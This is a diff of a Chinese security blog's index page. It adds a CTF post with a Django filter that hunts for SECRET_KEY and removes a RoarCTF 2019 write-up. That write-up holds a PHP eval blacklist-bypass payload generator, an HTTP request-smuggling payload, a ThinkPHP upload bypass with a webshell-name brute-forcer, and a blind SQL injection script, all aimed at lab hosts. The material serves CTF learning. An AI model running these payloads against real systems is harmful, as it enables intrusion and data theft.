@@ -66,6 +66,98 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-django快速查找配置" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/12/21/django%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BE%E9%85%8D%E7%BD%AE/" class="article-date">
+  <time class="dt-published" datetime="2019-12-20T17:14:33.085Z" itemprop="datePublished">2019-12-21</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web/">web</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2019/12/21/django%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BE%E9%85%8D%E7%BD%AE/">django快速查找配置</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="django快速查找配置"><a href="#django快速查找配置" class="headerlink" title="django快速查找配置"></a>django快速查找配置</h1><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>在看p牛的picklecode wp的时候卡在secret_key查找那边</p>
+<p>看到p牛一句很容易,人就傻掉了</p>
+<p><img src="https://i.loli.net/2019/12/21/8mnp5l7ODuPkBQo.png" alt="image209"></p>
+<p>花了一天时间(踩了个坑),写了个快速查找secret_key的脚本</p>
+<p>代码写的不太好,自己改改用吧////</p>
+<pre><code class="python">from django.http.response import HttpResponse, HttpResponseRedirect
+from django.template import engines
+from django.contrib.auth import login as auth_login, get_user_model, authenticate
+from django.contrib.auth.views import LoginView, logout_then_login
+from django.contrib.auth.decorators import login_required
+from django.views import generic
+from django import template
+
+import django
+from django import template
+register = template.Library()
+
+@register.filter
+def get_dict(obj,way=&quot;&quot;,depth=0):
+    if depth&gt;11:
+        return 
+    objdir=dir(obj)
+    r={&quot;dict&quot;:objdir,&quot;way&quot;:way}
+    result=&quot;&quot;
+
+    for i in objdir:            
+        try :
+            if &#39;_&#39; == i[0]:
+                continue
+            if getattr(obj, &#39;__module__&#39;, None)!=None and getattr(obj, &#39;__module__&#39;, None).split(&#39;.&#39;)[0] == django.__name__:
+                result+=get_dict(getattr(obj,i,None),way+&quot;.&quot;+i,depth+1) 
+        except TypeError:
+            pass
+
+    if &quot;SECRET_KEY&quot; in objdir or &quot;settings&quot; in objdir:
+        print(way)
+        return result+way+&quot;\n&quot;
+    return result</code></pre>
+<p>这个是把所有符合条件的都输出,你可以通过修改递归深度和返回条件来加快,不然要等个几分钟</p>
+<h2 id="顺便说下踩到的坑"><a href="#顺便说下踩到的坑" class="headerlink" title="顺便说下踩到的坑"></a>顺便说下踩到的坑</h2><p>因为不知道dir()和<code>__dict__</code>的区别,一直以为<code>__dict__</code>==dir,然后就boomm</p>
+<p>dir()和<code>__dict__</code>的区别</p>
+<p>最简单的一句发\话是<code>__dict__</code>是dir的子集合</p>
+<p> <a href="https://stackoverflow.com/questions/13302917/whats-the-difference-between-dirself-and-self-dict/13302981#13302981" target="_blank" rel="noopener">https://stackoverflow.com/questions/13302917/whats-the-difference-between-dirself-and-self-dict/13302981#13302981</a> </p>
+<p>所以以后查看对象的所有属性一定要用dir()</p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2019/12/21/django快速查找配置/">http://blog.ccreater.top/2019/12/21/django快速查找配置/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2019/12/21/django%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BE%E9%85%8D%E7%BD%AE/" data-id="cka3ckr2s0024v4v0dcqj6t8n" data-title="django快速查找配置" class="article-share-link">Share</a>
+      
+	  
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+
+  
     <article id="post-jwt攻击方式" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2019/12/19/jwt%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/" class="article-date">
@@ -1997,355 +2089,11 @@ $phar-&gt;stopBuffering();
 
 
   
-    <article id="post-roarctf2019" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2019/10/15/roarctf2019/" class="article-date">
-  <time class="dt-published" datetime="2019-10-15T14:36:51.706Z" itemprop="datePublished">2019-10-15</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2019/10/15/roarctf2019/">roarctf2019</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="roarctf2019"><a href="#roarctf2019" class="headerlink" title="roarctf2019"></a>roarctf2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="easycalc"><a href="#easycalc" class="headerlink" title="easycalc"></a>easycalc</h3><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><pre><code class="php">
-&lt;?php
-error_reporting(0);
-if(!isset($_GET[&#39;num&#39;])){
-    show_source(__FILE__);
-}else{
-        $str = $_GET[&#39;num&#39;];
-        $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];
-        foreach ($blacklist as $blackitem) {
-                if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $str)) {
-                        die(&quot;what are you want to do?&quot;);
-                }
-        }
-        eval(&#39;echo &#39;.$str.&#39;;&#39;);
-}
-?&gt;</code></pre>
-<h4 id="解法一-肝就完事"><a href="#解法一-肝就完事" class="headerlink" title="解法一 肝就完事"></a>解法一 肝就完事</h4><p>强行绕过限制</p>
-<p>关键:<code>((10000000000000).(0)){3}</code>=&gt;E</p>
-<p>python脚本</p>
-<pre><code class="python">arr={
-    &quot;0&quot;:&#39;&#39;&#39;((0).(0)){0}&#39;&#39;&#39;,
-    &quot;1&quot;:&#39;&#39;&#39;((1).(0)){0}&#39;&#39;&#39;,
-    &quot;2&quot;:&#39;&#39;&#39;((2).(0)){0}&#39;&#39;&#39;,
-    &quot;3&quot;:&#39;&#39;&#39;((3).(0)){0}&#39;&#39;&#39;,
-    &quot;4&quot;:&#39;&#39;&#39;((4).(0)){0}&#39;&#39;&#39;,
-    &quot;5&quot;:&#39;&#39;&#39;((5).(0)){0}&#39;&#39;&#39;,
-    &quot;6&quot;:&#39;&#39;&#39;((6).(0)){0}&#39;&#39;&#39;,
-    &quot;7&quot;:&#39;&#39;&#39;((7).(0)){0}&#39;&#39;&#39;,
-    &quot;8&quot;:&#39;&#39;&#39;((8).(0)){0}&#39;&#39;&#39;,
-    &quot;9&quot;:&#39;&#39;&#39;((9).(0)){0}&#39;&#39;&#39;,
-    &quot;-&quot;: &quot;((-1).(0)){0}&quot;,
-    &quot;.&quot; :&quot;((1.1).(0)){1}&quot;,
-    &quot;E&quot;: &quot;((10000000000000000000).(1)){3}&quot;,
-    &quot;p&quot;:&quot;((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))&quot;,
-    &quot;$&quot;:&quot;((((-1).(0)){0})&amp;(((4).(0)){0}))&quot;,
-    &quot;l&quot;:&quot;((((-1).(0)){0})&amp;(((4).(0)){0}))|(~((0).(0)){0})&amp;~((~((8).(0)){0})&amp;(~((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))))&quot;,
-    &quot;H&quot;: &quot;(~((0).(0)){0})&amp;~((~((8).(0)){0})&amp;(~((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))))&quot;,
-    &quot;Z&quot; : &quot;(~(((((-1).(0)){0})&amp;(((4).(0)){0}))))&amp;(~((~(((8).(0)){0}))&amp;((~(((2).(0)){0}))&amp;(~(((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1})))))))&quot;,
-    &quot;v&quot; :&quot;(((2).(0)){0})|((~((1).(0)){0})&amp;((10000000000000000000).(1)){3})&quot;,
-    &quot;D&quot; :&quot;(~((1).(0)){0})&amp;((10000000000000000000).(1)){3}&quot;,
-    &quot;A&quot; :&quot;(~((2).(0)){0})&amp;(~((~((1).(0)){0})&amp;(~((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1})))))&quot;,
-    &quot;P&quot; :&quot;(~((1.1).(0)){1})&amp;((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))&quot;,
-    &quot;O&quot; :&quot;(~((0).(0)){0})&amp;(~((~((8).(0)){0})&amp;((~((2).(0)){0})&amp;(~((10000000000000000000).(1)){3}))))&quot;,
-    &quot;S&quot; :&quot;(~((((-1).(0)){0})&amp;(((4).(0)){0})))&amp;(~((~((2).(0)){0})&amp;(~((10000000000000000000).(1)){3})))&quot;,
-    &quot;U&quot; :&quot;(((10000000000000000000).(1)){3})|((~((((-1).(0)){0})&amp;(((4).(0)){0})))&amp;(~((~((1).(0)){0})&amp;(~((1.1).(0)){2}))))&quot;,
-    &quot;_&quot; :&quot;((10000000000000000000).(1)){3}|(((~((((-1).(0)){0})&amp;(((4).(0)){0})))&amp;(~((~((1).(0)){0})&amp;(~((1.1).(0)){1})))))&quot;,
-    &quot;T&quot; :&quot;(~(((1).(0)){0}&amp;(~((2).(0)){0})))&amp;(~((~((10000000000000000000).(1)){3})&amp;(~(((1).(0)){0}&amp;(~((1.1).(0)){1})))))&quot;,
-    &quot;I&quot; :&quot;(~(((0).(0)){0}))&amp;(~((~((8).(0)){0})&amp;((~((1).(0)){0})&amp;(~((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))))))&quot;,
-    &quot;N&quot; :&quot;(~((0).(0)){0})&amp;(~((~((8).(0)){0})&amp;((~(((2).(0)){0}))&amp;(~((~((1).(0)){0})&amp;((10000000000000000000).(1)){3})))))&quot;,
-    &quot;f&quot; :&quot;((((-1).(0)){0})&amp;(((4).(0)){0}))|((~(((4).(0)){0}))&amp;(~((~(((2).(0)){0}))&amp;(~((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))))))&quot;,
-    &quot;B&quot; :&quot;(~(((4).(0)){0}))&amp;(~((~(((2).(0)){0}))&amp;(~((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1})))))&quot;,
-    &quot;r&quot; :&quot;(~((~(((2).(0)){0}))&amp;(~((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1})))))&quot;,
-    &quot;[&quot; :&quot;(~(((((-1).(0)){0})&amp;(((4).(0)){0}))))&amp;(~((~((8).(0)){0})&amp;((~(((2).(0)){0}))&amp;(~(((10000000000000000000).(1)){3})))))&quot;,
-    &quot;]&quot; :&quot;(((10000000000000000000).(1)){3})|((((8).(0)){0})&amp;(~(((((-1).(0)){0})&amp;(((4).(0)){0})))))&quot;,
-    &quot;C&quot;:&quot;(~(((4).(0)){0}))&amp;(~((~(((2).(0)){0}))&amp;(~(((10000000000000000000).(1)){3}))))&quot;,
-    &quot;M&quot;:&quot;(~(((0).(0)){0}))&amp;(~((~(((8).(0)){0}))&amp;(~(((10000000000000000000).(1)){3}))))&quot;,
-    &quot;\\&quot;:&quot;(~(((((1).(0)){0}))&amp;(~(((2).(0)){0})))&amp;~((~(((10000000000000000000).(1)){3}))&amp;~((((8).(0)){0})&amp;(~(((((-1).(0)){0})&amp;(((4).(0)){0})))))))&quot;,
-    &quot;/&quot;:&quot;((((1.1).(0)){1})|(((-1).(0)){0}))&quot;,
-    &quot;G&quot;:&quot;(~(((8).(0)){0}))&amp;(~((~(((2).(0)){0}))&amp;(~(((10000000000000000000).(1)){3}))))&quot;,
-    &quot;g&quot;:&quot;(((10000000000000000000).(1)){3})|((((2).(0)){0})&amp;(((1.1).(0)){1}))&quot;,
-    &quot;a&quot;:&quot;((((1).(0)){0})&amp;((~((2).(0)){0})))|((((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1})))&amp;(~((((1).(0)){0})&amp;(~(((1.1).(0)){1})))))&quot;
-    }
-s=&quot;scandir&quot;
-def topayload(s):
-    result=&quot;&quot;
-    for i in s:
-        if(i in arr):
-            result+=(&quot;(&quot;+arr[i]+&quot;)&quot;+&quot;.&quot;)
-            continue
-        if(i.upper() in arr):
-            result+=(&quot;(&quot;+arr[i.upper()]+&quot;)&quot;+&quot;.&quot;)
-            continue
-        if(i.lower() in arr):
-            result+=(&quot;(&quot;+arr[i.lower()]+&quot;)&quot;+&quot;.&quot;)
-    return result[:-1]
-def tomethod(meth,para,c=True):
-    if c:
-        return &quot;(&quot;+topayload(meth)+&quot;)(&quot;+topayload(para)+&quot;)&quot;
-    else :
-        return &quot;(&quot;+topayload(meth)+&quot;)(&quot;+(para)+&quot;)&quot;
-# print(tomethod(&quot;var_dump&quot;,tomethod(&quot;scandir&quot;,&quot;/&quot;),False))
-print(tomethod(&quot;var_dump&quot;,tomethod(&quot;file&quot;,&quot;/f1agg&quot;),False))
-# print(tomethod(&quot;file_get_contents&quot;,&quot;/f1agg&quot;))
-</code></pre>
-<h4 id="解法二-HTTP走私"><a href="#解法二-HTTP走私" class="headerlink" title="解法二 HTTP走私"></a>解法二 HTTP走私</h4><p>http走私请看:<a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">https://paper.seebug.org/1048/</a></p>
-<p>这题php禁用了<code>$blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;反引号&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];</code></p>
-<p>apache再禁用了字母和不可打印字符</p>
-<p>后来看别人的wp知道了,虽然服务器返回400,但是还会将请求转发给后端,标准的http走私</p>
-<p><img src="https://i.loli.net/2019/10/18/9YgzckxODPiNe6C.png" alt="image.png"></p>
-<p>真几把神奇，刚看到http走私的时候我还以为是前后端对content-type的解析不同</p>
-<p>结合getallheads来绕过php字符限制</p>
-<p>最后payload:</p>
-<pre><code>POST /calc.php?num=eval(end(getallheaders())); HTTP/1.1
-Host: node3.buuoj.cn:28023
-Accept: */*
-X-Requested-With: XMLHttpRequest
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36
-Referer: http://node3.buuoj.cn:28023/
-Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
-Connection: close
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 422
-Content-Length: 0
-A: var_dump(file_get_contents(&quot;/f1agg&quot;));
-
-</code></pre><h4 id="解法三-利用php字符串解析特性绕过apache-waf"><a href="#解法三-利用php字符串解析特性绕过apache-waf" class="headerlink" title="解法三 利用php字符串解析特性绕过apache waf"></a>解法三 利用php字符串解析特性绕过apache waf</h4><p>php字符串解析特性</p>
-<p><img src="https://image.3001.net/images/20190904/1567560438_5d6f12f680afe.png!small" alt=""></p>
-<p><img src="https://image.3001.net/images/20190904/1567560448_5d6f13004035f.png!small" alt=""></p>
-<p>当我们发送这样一个请求是:<code>?%20num=123</code></p>
-<p>apache的检查规则只能匹配到num,而这个请求在php却会被解析为$_GET[‘num’]最后成功绕过apache的waf</p>
-<h3 id="Easy-Java"><a href="#Easy-Java" class="headerlink" title="Easy Java"></a>Easy Java</h3><p>扫目录发现一个Download,去登入界面查找一下download,发现<code>Download?filename=help.docx</code></p>
-<p>可是无论下什么也不行,看了别人的wp发现post就可以233333</p>
-<p>接下来就简单了,因为这是一个tomcat的网站</p>
-<p>贴一个tomcat的结构图</p>
-<p><img src="https://i.loli.net/2019/09/01/LduWtSfIh8bDA7Z.png" alt=""></p>
-<p>先去查看一下WEB-INF/web.xml</p>
-<p>发现</p>
-<pre><code class="xml">    &lt;servlet&gt;
-        &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;
-        &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;
-    &lt;/servlet&gt;</code></pre>
-<p>于是去WEB-INF/classes/com/wm/ctf/FlagController.class</p>
-<p>查看,发现一个base64编码的字符串</p>
-<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g82oi6jxybj31240l2dj8.jpg" alt="image.png"></p>
-<h3 id="simple-upload"><a href="#simple-upload" class="headerlink" title="simple_upload"></a>simple_upload</h3><h4 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h4><pre><code class="php">&lt;?php
-namespace Home\Controller;
-
-use Think\Controller;
-
-class IndexController extends Controller
-{
-    public function index()
-    {
-        show_source(__FILE__);
-    }
-    public function upload()
-    {
-        $uploadFile = $_FILES[&#39;file&#39;] ;
-        $_FILES[&#39;file&#39;][&#39;name&#39;]
-        if (strstr(strtolower($uploadFile[&#39;name&#39;]), &quot;.php&quot;) ) {
-            return false;
-        }
-
-        $upload = new \Think\Upload();// 实例化上传类
-        $upload-&gt;maxSize  = 4096 ;// 设置附件上传大小
-        $upload-&gt;allowExts  = array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);// 设置附件上传类型
-        $upload-&gt;rootPath = &#39;./Public/Uploads/&#39;;// 设置附件上传目录
-        $upload-&gt;savePath = &#39;&#39;;// 设置附件上传子目录
-        $info = $upload-&gt;upload() ;
-        if(!$info) {// 上传错误提示错误信息
-          $this-&gt;error($upload-&gt;getError());
-          return;
-        }else{// 上传成功 获取上传文件信息
-          $url = __ROOT__.substr($upload-&gt;rootPath,1).$info[&#39;file&#39;][&#39;savepath&#39;].$info[&#39;file&#39;][&#39;savename&#39;] ;
-          echo json_encode(array(&quot;url&quot;=&gt;$url,&quot;success&quot;=&gt;1));
-        }
-    }
-}</code></pre>
-<h4 id="解法一-thinkphp漏洞"><a href="#解法一-thinkphp漏洞" class="headerlink" title="解法一 thinkphp漏洞"></a>解法一 thinkphp漏洞</h4><p>利用<code>Think\Controller,\Think\Upload()</code> 等关键字查询到该thinkphp版本大致在3.2.x,这里我去找了3.2.3的源码</p>
-<p>阅读文件上传部分代码发现</p>
-<pre><code class="php">&lt;?php
-    ....
-    public function upload($files = &#39;&#39;)
-    {
-        if (&#39;&#39; === $files) {
-            $files = $_FILES;
-        }
-        .....
-
-        $files = $this-&gt;dealFiles($files);
-        foreach ($files as $key =&gt; $file) {
-            $file[&#39;name&#39;] = strip_tags($file[&#39;name&#39;]);
-            if (!isset($file[&#39;key&#39;])) {
-                $file[&#39;key&#39;] = $key;
-            }
-        ....
-    }
-    ....
-    ?&gt;</code></pre>
-<p>这里注意到有个strip_tags,查询文档<code>从字符串中去除 HTML 和 PHP 标记</code></p>
-<p>ok,成功找到绕过后缀名限制的方法</p>
-<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g82rhln3m6j31240l2whe.jpg" alt="image.png"></p>
-<p>成功getflag美滋滋</p>
-<h4 id="解法二-上传多个文件绕过后缀名检测"><a href="#解法二-上传多个文件绕过后缀名检测" class="headerlink" title="解法二  上传多个文件绕过后缀名检测"></a>解法二  上传多个文件绕过后缀名检测</h4><p>大佬们太强了/fad/fad</p>
-<pre><code class="php"> $uploadFile = $_FILES[&#39;file&#39;] ;
-if (strstr(strtolower($uploadFile[&#39;name&#39;]), &quot;.php&quot;) ) {
-            return false;
-        }</code></pre>
-<p>如果上传多个文件, $uploadFile内包含多个文件,<code>strstr(strtolower($uploadFile[&#39;name&#39;]), &quot;.php&quot;)</code>自然也就无效了,接下来就是获取文件名,就可以getshell,因为thinkphp文件名是递增的,所以也就很容易获取到想要的文件了</p>
-<pre><code class="pyhon">import requests
-url=&quot;http://aba32602-5c6b-4a9f-bfa6-bbf2ca660f7e.node3.buuoj.cn/Public/Uploads/2019-10-18/&quot;
-i=(int(&quot;5da9dd208595a&quot;,16)+1)
-while True:
-    print(url+hex(i)[2:]+&quot;.php&quot;)
-    res=requests.get(url+hex(i)[2:]+&quot;.php&quot;)
-    print(res.status_code)
-    if(res.status_code==200):
-        print(url+hex(i)[2:]+&quot;.php&quot;)
-        break
-
-    i+=1</code></pre>
-<p>虽然说可以爆出来，不过也要跑好一会</p>
-<h3 id="Online-Proxy"><a href="#Online-Proxy" class="headerlink" title="Online Proxy"></a>Online Proxy</h3><p>利用libcurl和paras_url的差异来判断</p>
-<p><a href="http://node3.buuoj.cn:28001/?url=http://user@39.108.164.219@ccccccccccccc.com" target="_blank" rel="noopener">http://node3.buuoj.cn:28001/?url=http://user@39.108.164.219@ccccccccccccc.com</a></p>
-<p>200</p>
-<p><a href="http://node3.buuoj.cn:28001/?url=http://user@ccccccccccccc.com@39.108.164.219" target="_blank" rel="noopener">http://node3.buuoj.cn:28001/?url=http://user@ccccccccccccc.com@39.108.164.219</a></p>
-<p>504</p>
-<p>而访问<a href="http://node3.buuoj.cn:28001/?url=http://39.108.164.219" target="_blank" rel="noopener">http://node3.buuoj.cn:28001/?url=http://39.108.164.219</a></p>
-<p>也是504,所以有可能使用file_get_contents来访问url</p>
-<p>刚开始一直盯着url,后面看到收集信息,99%是sql注入的题</p>
-<p>就是不知道要收集什么信息</p>
-<pre><code class="html">&lt;!-- Debug Info: 
- Duration: 0.20821499824524 s 
- Current Ip: 127.0.0.1  --&gt;
-&lt;!-- Debug Info: 
- Duration: 0.34751987457275 s 
- Current Ip: &#39;# 
-Last Ip: &#39; --&gt;</code></pre>
-<p>这题虽然是sql注入,但比较操蛋的是,sql注入的是last ip</p>
-<p>因为这个加上自己的懒惰让我搞了8-9个小时,因小失大/fad</p>
-<p>题目提示会收集信息,能收集的大概也就是ip地址</p>
-<p>于是找到x-forward-for http注入,虽然说的轻松,但是我完全找了好久还加上了wp的帮助</p>
-<p>emmmm直接扔脚本</p>
-<pre><code class="python">import requests
-import string
-import random
-import time
-import sys
-def rand_str(length=8):
-    return &#39;&#39;.join(random.sample(string.ascii_letters + string.digits, length))
-
-ii=0
-def curl_url(sql):
-    global ii
-    headers={
-        &quot;Host&quot;:&quot;node3.buuoj.cn:28645&quot;,
-        &quot;Cache-Control&quot;:&quot;max-age=0&quot;,
-        &quot;X-Forwarded-For&quot;:&quot;&quot;,
-        &quot;Upgrade-Insecure-Requests&quot;:&quot;1&quot;,
-        &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36&quot;,
-        &quot;Accept&quot;:&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;,
-        &quot;Accept-Language&quot;:&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;,
-        &quot;Connection&quot;:&quot;close&quot;
-    }
-    cookies={&quot;track_uuid&quot;:&quot;1e3b12a4-60f8-4778-a0b7-%s;&quot; % rand_str()}
-    #1&#39;+if(ascii(substr(hex((select GROUP_CONCAT(table_name) FROM information_schema.tables WHERE TABLE_SCHEMA=database())),1,1))&gt;0,sleep(10),0)+&#39;13
-    # headers[&quot;X-Forwarded-For&quot;]=&quot;1&#39;+if(&quot;+sql+&quot;,sleep(10),0)+&#39;&quot;+str(ii)
-    url=&quot;http://node3.buuoj.cn:28841?url=http://127.0.0.1&quot;
-    #清空
-    while True:
-        headers[&quot;X-Forwarded-For&quot;]=&quot;clear&quot;+str(ii)
-        try:
-            res= requests.get(url,headers=headers,cookies=cookies,timeout=3)
-        except :
-            pass
-        if &quot;Last Ip: clear&quot; in res.text:
-            break
-        ii+=1
-    #压入
-    headers[&quot;X-Forwarded-For&quot;]=&quot;1&#39;+if(&quot;+sql+&quot;,sleep(10),0)+&#39;&quot;+str(ii)
-    res= requests.get(url,headers=headers,cookies=cookies,timeout=3)
-    #执行
-    while True:
-        ii+=1
-        headers[&quot;X-Forwarded-For&quot;]=&quot;clear&quot;+str(ii)
-
-        try:
-            res= requests.get(url,headers=headers,cookies=cookies,timeout=3)
-        except :
-            return 1
-
-        if sql not in res.text:
-            curl_url(sql)
-        return 0
-
-
-#database information_schema,test,mysql,ctftraining,performance_schema,F4l9_D4t4B45e,ctf
-#table  F4l9_t4b1e
-#column F4l9_C01uMn
-#flag flag{G1zj1n_W4nt5_4_91r_Fr1end},flag{03a6ead5-ffec-4bc0-bffd-92efd5a81e11}
-sql=&quot;(substr(hex((select GROUP_CONCAT(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e )),INDEX,1))=&#39;GUESS&#39;&quot;
-result=&quot;696e666f726d6174696f6e5f736368656d612c746573742c6d7973716c2c637466747261696e696e672c706572666F726D616E63655F736368656D612c46346c395&quot;
-result=&quot;666c61677b47317a6a316e5f57346e74355f345f393172115&quot;
-index=len(result)
-
-while True:
-    index+=1
-    for i in range(16):
-        ii+=1
-        tmp=sql.replace(&quot;INDEX&quot;,str(index)).replace(&quot;GUESS&quot;,hex(i)[2:])
-
-        if curl_url(tmp):
-            result+=hex(i)[2:]
-            print(result)
-            break
-        print(&quot;第&quot;+str(index)+&quot;不是&quot;+hex(i)[2:])</code></pre>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2019/10/15/roarctf2019/">http://blog.ccreater.top/2019/10/15/roarctf2019/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2019/10/15/roarctf2019/" data-id="cka3ckr39003jv4v0gtuqfa1u" data-title="roarctf2019" class="article-share-link">Share</a>
-      
-	  
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-
-  
 
 
   <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/page/7/">&lt;- Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span>
+    <a class="extend prev" rel="prev" href="/page/7/">&lt;- Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/9/">Next -&gt;</a>
   </nav>
 
 </section>
@@ -2398,6 +2146,10 @@ while True:
       <ul>
         
           <li>
+            <a href="/2020/11/13/XNUCA_2020_oooooooldjs%E9%A2%98%E8%A7%A3/">XNUCA_2020_oooooooldjs题解</a>
+          </li>
+        
+          <li>
             <a href="/2020/11/12/Academy_write_up/">Academy_write_up</a>
           </li>
         
@@ -2411,10 +2163,6 @@ while True:
         
           <li>
             <a href="/2020/10/20/LFI%E5%88%A9%E7%94%A8php%E8%87%AA%E5%B8%A6%E7%9A%84pearcmd.php%E7%9B%B4%E6%8E%A5RCE/">LFI利用php自带的pearcmd.php直接RCE</a>
-          </li>
-        
-          <li>
-            <a href="/2020/10/15/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/">2020西湖论剑</a>
           </li>
         
       </ul>
